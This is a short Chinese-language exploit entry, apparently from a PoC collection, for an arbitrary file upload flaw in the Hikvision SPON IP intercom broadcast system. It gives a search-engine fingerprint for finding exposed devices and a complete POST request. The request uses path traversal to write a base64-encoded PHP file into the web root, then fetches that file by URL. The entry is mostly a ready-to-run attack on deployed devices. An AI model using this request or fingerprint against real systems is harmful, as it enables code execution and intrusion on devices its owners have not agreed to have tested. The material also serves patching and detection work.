# 海康威视SPONIP网络对讲广播系统busyscreenshotpush存在任意文件上传漏洞

- **系统**：海康　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`Hunter：`web.body="vendors/custom/html5.min.js"``
- **请求**：`POST /php/busyscreenshotpush.php HTTP/1.1`
- **关键头**：`Content-Length: 181`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
jsondata[caller]=1&jsondata[callee]=1&jsondata[imagename]=..\..\..\Wnmp\WWW\upload\1_0_xjayuiwqzj.php&jsondata[imagecontent]=PD9waHAgZWNobyAxMTEqMTExOyB1bmxpbmsoX19GSUxFX18pOyA/Pg==

上传文件位置
GET /upload/1_0_xjayuiwqzj.php HTTP/1.1
Host:

\[spon-网络对讲-busyscreenshotpush-任意文件上传.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 海康威视SPON IP网络对讲广播系统busyscreenshotpush存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 海康威视SPON IP网络对讲广播系统